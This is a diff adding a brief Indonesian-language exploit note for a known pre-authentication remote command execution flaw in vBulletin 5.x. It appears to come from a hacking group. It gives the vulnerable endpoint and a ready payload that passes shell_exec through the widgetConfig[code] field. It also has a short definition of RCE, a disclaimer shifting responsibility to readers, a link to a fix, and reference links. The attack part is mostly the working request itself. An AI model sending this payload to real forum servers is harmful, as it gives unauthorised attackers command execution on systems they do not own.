@@ -1,0 +1,22 @@
+vBulletin v5.x.x 0day Critical RCE
+Author: r00tpgp
+
+RCE (Remote Command Injection) adalah kelemahan dimana attacker dapat memerintah sistem
+untuk menjalankan kode yang dinginkan, Tipe attack seperti ini biasanya karena kurangnya
+validasi terhadap data yang bisa dikendalikan oleh user.
+
+Perlu diingatkan, ini tanggung jawab masing-masing!
+
+Full path exploit: /ajax/render/widget_php
+Payload Request: widgetConfig[code]=echo shell_exec('uname -a');
+
+Solusi? bisa cek disini: https://twitter.com/nickcano93/status/1176758990753026048
+
+Reference:
+https://blog.sucuri.net/2019/09/zero-day-rce-in-vbulletin-v5-0-0-v5-5-4.html
+https://packetstormsecurity.com/files/154623/vBulletin-5.x-0-Day-Pre-Auth-Remote-Command-Execution.html
+
+Regard~
+Willsec (not a real nick, i always hide my real nick, this is about privacy.)
+
+Thanks to: Indonesian Code Party & ManadoGhost
